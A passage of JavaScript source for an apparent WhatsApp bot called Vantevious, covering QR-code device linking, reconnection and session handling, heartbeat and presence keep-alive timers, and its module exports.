        console.log('║   📌  SCAN THIS QR CODE WITH WHATSAPP                 ║');
        console.log('║   Settings → Linked Devices → Link a Device           ║');
        console.log('╚══════════════════════════════════════════════════════╝\n');
        qrcode.generate(qr, { small: true });
        console.log('\n⏱️  QR expires in ~2 min — a new one prints automatically.\n');
      }

      if (connection === 'close') {
        const code = lastDisconnect?.error?.output?.statusCode;
        const loggedOut = code === DisconnectReason.loggedOut;
        const badSession = code === DisconnectReason.badSession;
        lastDisconnectAt = Date.now();
        console.log(`⚠️  Connection closed (code=${code}).`);
        isStartingMain = false;

        if (loggedOut || badSession) {
          console.log('🔐 Session invalid — wiping and requesting fresh QR...');
          bootRetries = 0;
          connectedOnce = false;
          setTimeout(() => startVantevious(true), 2000);
          return;
        }

        bootRetries++;
        // PRESERVE SESSION ON RECONNECT! DO NOT WIPE!
        const wait = Math.min(2000 * bootRetries, 10000);
        console.log(`🔄 Reconnecting in ${wait}ms (attempt ${bootRetries})... preserving session`);
        setTimeout(() => startVantevious(false), wait);
      }
      else if (connection === 'open') {
        bootRetries = 0;
        isStartingMain = false;
        connectedOnce = true;
        console.log(`\n✅ ${BOT_NAME} is now ONLINE\n`);
        console.log(`🧠 Brain: Active with Unified AI`);
        try { await sock.sendPresenceUpdate('available'); } catch(e) {}
        try { if (fs.existsSync(MENU_IMAGE)) await sock.updateProfilePicture(sock.user.id, { url: MENU_IMAGE }); } catch(e) {}
      }
    });

    return sock;
  } catch(e) {
    console.error('startVantevious error:', e.message);
    isStartingMain = false;
    setTimeout(() => startVantevious(false), 5000);
  }
}

// Start the main bot
startVantevious(false);

// Auto-start pairlink server
setTimeout(() => { try { startPairlinkServer(); } catch(e) { console.error('Pairlink start:', e.message); } }, 1500);

// Load existing pair sessions on startup
setTimeout(async () => {
  try {
    const folders = fs.readdirSync(PAIR_SESSIONS_DIR).filter(f => { try { return fs.statSync(path.join(PAIR_SESSIONS_DIR, f)).isDirectory() && f.startsWith('session-'); } catch(e) { return false; } });
    for (const f of folders) { const n = f.replace('session-', ''); console.log(`Loading session for +${n}...`); startSession(n, null, false).catch(e => console.error(`Session ${n}:`, e.message)); }
  } catch(e) {}
}, 3000);

// Heartbeat — gentle reconnection
setInterval(async () => {
  try {
    if (isStartingMain) return;
    if (!mainSockRef || !mainSockRef.user) {
      if (connectedOnce && (Date.now() - lastDisconnectAt) > 60000) {
        console.log('💓 Heartbeat — main sock not connected, restarting...');
        try { if (mainSockRef) mainSockRef.end(new Error('heartbeat')); } catch(e) {}
        setTimeout(() => startVantevious(false), 2000);
      }
    } else {
      try { await mainSockRef.sendPresenceUpdate('available'); } catch(e) {}
    }
  } catch(e) { console.error('Heartbeat error:', e.message); }
}, 60000);

// Presence keep-alive every 2 min for main + all pairs
setInterval(async () => {
  try { if (mainSockRef?.user) await mainSockRef.sendPresenceUpdate('available'); } catch(e) {}
  for (const [, ps] of activePairs) { try { if (ps.user) await ps.sendPresenceUpdate('available'); } catch(e) {} }
}, 2 * 60 * 1000);

/* ═══════════════════════════════════════════════════════════════════════
   EXPORTS
   ═══════════════════════════════════════════════════════════════════════ */
module.exports = {
  addMessage,
  getStats,
  getWeeklyStats,
  generateSpeech,
  detectLang,
  MAX_CHARS,
  LANGS,

  runtime,
  sleep,
  smsg,
  builtInCommands,
  startPairlinkServer,
  getPublicUrl,
  VanteGodBrain,
  readBotInfo,
  APIs,
  toAudio,
  toPTT,
  toVideo,
  addGroupStatsMessage,
  getGroupStats,
  getWeeklyGroupStats,
  rankUsers,
  generateSpeechAudio,
  parseTtsInput
};

